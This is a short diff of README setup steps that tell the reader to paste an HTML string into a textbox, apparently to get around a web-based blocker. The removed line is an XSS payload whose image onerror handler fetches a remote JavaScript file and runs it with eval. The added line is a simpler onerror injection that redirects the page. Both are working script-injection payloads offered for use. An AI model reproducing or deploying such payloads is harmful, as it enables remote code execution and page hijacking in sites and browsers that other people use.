@@ -7,7 +7,15 @@
 * Then, click the green document button.
 * In the textbox, paste the following string:
 ```
-<img src=# onerror='fetch("https://raw.githubusercontent.com/Ajayadla/Blobbypasscode/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
+<!DOCTYPE html>
+<html>
+ <body>
+
+
+  <img src="broken.jpg" onerror=location="https://www.google.com">
+ <body>
+<html>
+
 ```
 
 ### How to use (after Setup):
